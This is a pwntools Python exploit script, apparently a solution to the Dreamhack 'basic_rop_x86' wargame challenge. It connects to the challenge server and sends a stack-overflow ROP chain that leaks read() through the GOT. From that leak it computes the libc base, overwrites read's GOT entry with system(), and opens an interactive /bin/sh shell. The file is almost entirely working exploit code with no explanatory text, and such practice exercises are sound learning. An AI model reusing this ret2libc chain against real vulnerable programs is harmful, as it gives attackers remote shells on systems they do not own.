from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

p = remote("host1.dreamhack.games", 13822)
# p = process("./basic_rop_x86")
e = ELF("./basic_rop_x86")

# gdb.attach(p)

# [3] Get offset of system
libc = ELF("./libc.so.6")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
readtosystem = libc.symbols["read"]-libc.symbols["system"]
slog("read2System", readtosystem)

read_got = e.got["read"]
read_plt = e.plt["read"]
write_plt = e.plt["write"]

buf2sfp = 0x40
pop_ret = 0x080483d9
pop_pop_ret = 0x0804868a
pop_pop_pop_ret = 0x08048689

payload = b"A"*buf2sfp
payload += b"B"*0x4
payload += b"A"*0x4
payload += p32(write_plt)
payload += p32(pop_pop_pop_ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(0x4)

payload += p32(read_plt)
payload += p32(pop_pop_pop_ret)
payload += p32(0)
payload += p32(read_got)
payload += p32(0x4+0x8)

payload += p32(read_plt)
payload += p32(pop_ret)
payload += p32(read_got+0x4)

p.send(payload)

p.recvn(0x40)
read_addr = u32(p.recvn(4))
slog("read()", read_addr)

libc_base = read_addr - libc.symbols["read"]
slog("read offset", libc.symbols["read"])
slog("system offset", libc.symbols["system"])
slog("lb", libc_base)

system_addr = libc_base + libc.symbols["system"]
slog("system()", system_addr)

p.send(p32(system_addr)+b"/bin/sh\x00")

p.interactive()